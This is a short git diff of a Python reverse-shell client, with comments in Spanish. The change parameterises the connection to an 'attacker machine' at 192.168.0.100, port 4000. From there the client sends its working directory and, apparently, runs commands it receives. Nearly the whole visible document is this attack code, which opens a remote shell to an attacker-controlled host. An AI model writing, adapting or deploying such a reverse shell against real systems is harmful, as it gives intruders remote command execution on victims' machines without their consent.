@@ -1,7 +1,9 @@
 import socket
 import os
 import subprocess
-from pip._vendor.distlib.compat import raw_input
+from pip._vendor.distlib.compat import raw_input 
+ip_atacante = '192.168.0.100' #ip de la maquina atacante
+puerto = 4000
 def shell():
     currentDir = os.getcwd()
     servidor.send(currentDir.encode())
@@ -28,6 +30,6 @@ def shell():
 
 
 servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-servidor.connect(('192.168.0.103', 4004))
+servidor.connect((ip_atacante, puerto))
 shell()
 servidor.close()
